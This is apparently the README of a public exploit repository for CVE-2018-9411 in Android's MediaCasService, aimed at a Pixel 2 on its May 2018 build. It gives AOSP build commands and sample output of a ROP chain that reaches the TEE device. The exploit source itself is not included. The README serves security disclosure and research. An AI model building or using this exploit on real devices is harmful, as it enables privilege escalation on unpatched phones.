# CVE-2018-9411

Exploit code for CVE-2018-9411 for MediaCasService.

Note that this exploit is only provided for educational or defensive purposes; it is not intended for any malicious or offensive use.

Full write-up for the vulnerability and the exploit is available [on the Zimperium blog](https://blog.zimperium.com/cve-2018-9411-new-critical-vulnerability-multiple-high-privileged-android-services).

If you have any questions, you are welcome to DM me on Twitter ([@tamir_zb](https://twitter.com/tamir_zb)).

## Build

**Note: this exploit is only intended to work on a specific device and build - Pixel 2 with the May 2018 security update** (fingerprint: `google/walleye/walleye:8.1.0/OPM2.171019.029.B1/4720900:user/release-keys`).

In order to build this:

1. [Download the Android source code](https://source.android.com/setup/build/downloading).
2. Put this repository in `AOSP/external`.
3. Run the following commands:

```
cd AOSP
source build/envsetup.sh
make cas_exploit
```

## Result

A successful run of this exploit should obtain access to the TEE device, which will be demonstrated by getting the QSEOS version.

Example exploit output:

```
[+] Prepared descrambler object
[+] Determined small heap address (address = 0xec9d8000)
[+] Prepared remote threads
[+] Found target thread (stack address = 0xeb42b000, libc address = 0xec51d000)
[+] Copied data for ROP chain
[+] ROP stack written
[+] Running ROP chain...
[+] QSEOS version = 0x14
```
